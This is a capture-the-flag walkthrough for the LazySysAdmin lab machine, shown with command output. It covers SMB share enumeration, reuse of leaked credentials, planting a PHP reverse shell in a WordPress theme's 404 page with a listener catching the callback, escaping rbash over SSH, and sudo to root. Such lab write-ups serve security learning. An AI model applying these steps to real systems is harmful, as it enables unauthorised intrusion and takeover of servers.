# LazySysAdmin Writeup

We start with a network scan 
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 5 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 300                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.111.157.53   f6:b6:81:a5:a1:8e      2     120  Unknown vendor                                                                                                                                                 
 10.111.157.105  00:0c:29:27:c8:45      2     120  VMware, Inc.                                                                                                                                                   
 10.111.157.58   d8:a8:81:42:0c:eb      1      60  Unknown vendor
```
\
We see that smb is open , so lets use smbmap to scan
```bash
smbmap -H 10.111.157.105            

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.111.157.105:445      Name: 10.111.157.105            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        share$                                                  READ ONLY       Sumshare
        IPC$                                                    NO ACCESS       IPC Service (Web server)
[*] Closed 1 connections
```
\
We see a read only share 'share$' , so lets access it 
```bash
smbclient //10.111.157.105/share$ -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 15 07:05:52 2017
  ..                                  D        0  Mon Aug 14 08:34:47 2017
  wordpress                           D        0  Tue Aug 15 07:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 08:08:26 2017
  wp                                  D        0  Tue Aug 15 06:51:23 2017
  deets.txt                           N      139  Mon Aug 14 08:20:05 2017
  robots.txt                          N       92  Mon Aug 14 08:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 08:39:56 2017
  apache                              D        0  Mon Aug 14 08:35:19 2017
  index.html                          N    36072  Sun Aug  6 01:02:15 2017
  info.php                            N       20  Tue Aug 15 06:55:19 2017
  test                                D        0  Mon Aug 14 08:35:10 2017
  old                                 D        0  Mon Aug 14 08:35:13 2017

                3029776 blocks of size 1024. 1459172 blocks available
```
\
So after seeing these , i run dirb and confirm that these are the files in the web server , we can access /phpmyadmin, /wordpress, /info.php 
\
So we get wp-config.php from the smb share and get some credentials , which we use to login into phpmyadmin to check what all dbs are there , but we see that only 2 dbs are there
<img width="234" height="329" alt="image" src="https://github.com/user-attachments/assets/298d1bd6-bd2d-42c1-90ce-7e1b8243d280" />

\
So , using the same credentials , we login into wordpress admin panel at /wordpress//wp-admin
\
And then we can see that theme files are editable , so we use PHP Pentest Monkey's script to get a reverse shell by replacing content of theme-footer (footer.php) , which did not give me a reverse shell after visiting the wordpress website 
\
So i decide to replace the 404 file instead , and access a non-existing page like 'http://10.111.157.105/wordpress/?p=2' , and i get a reverse shell as www-data
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.111.157.14
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from LazySysAdmin~10.111.157.105-Linux-i686 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/LazySysAdmin~10.111.157.105-Linux-i686/2026_01_22-08_30_49-416.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@LazySysAdmin:/$ 
```
\
Then after checking for a bit , i realised that we had found this file earlier
```bash
 cat deets.txt              
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
```
\
So we just chage to user togie using the creds togie:12345 
\
After becoming togie , we see that we are in a restricted shell 'rbash'
```bash
togie@LazySysAdmin:/$ cd ~
rbash: cd: restricted
```
\
So i ssh using the found password 
```bash
 ssh togie@10.111.157.105 -t bash     
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

togie@10.111.157.105's password: 
togie@LazySysAdmin:~$ echo $0
bash
```
\
After checking priviledges , we see that togie has all priviledges , so we just become root
```bash
id
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
togie@LazySysAdmin:~$ cd ~
togie@LazySysAdmin:~$ sudo -l
[sudo] password for togie: 
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
togie@LazySysAdmin:~$ sudo su root
root@LazySysAdmin:/home/togie# cd /root
root@LazySysAdmin:~# ls -la
total 28
drwx------  3 root root 4096 Aug 15  2017 .
drwxr-xr-x 22 root root 4096 Aug 21  2017 ..
-rw-------  1 root root 1000 Aug 21  2017 .bash_history
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Aug 14  2017 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root  347 Aug 21  2017 proof.txt
root@LazySysAdmin:~# cat proof.txt 
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
root@LazySysAdmin:~# 
```
\
The End , thank you for reading till here
